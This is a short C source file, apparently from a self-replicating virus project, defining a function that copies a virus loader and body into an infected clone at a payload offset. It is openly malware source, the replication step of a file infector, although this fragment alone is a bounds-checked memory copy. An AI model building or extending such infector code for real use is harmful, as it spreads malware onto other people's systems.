#include "virus.h"
#include "disasm.h"
#include "utils.h"
#include "jumps.h"
#include "compiler_utils.h"
#include "errors.h"

bool		copy_virus_to_clone(struct safe_ptr clone_ref,
			size_t payload_offset, const struct virus_header *vhdr)
{
	const size_t	full_virus_size = vhdr->full_virus_size;
	const void	*loader_entry   = vhdr->loader_entry;

	// copy loader and virus
	void	*loader_location = safe(clone_ref, payload_offset, full_virus_size);

	if (loader_location == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);

	memcpy(loader_location, loader_entry, full_virus_size);
	return true;
}
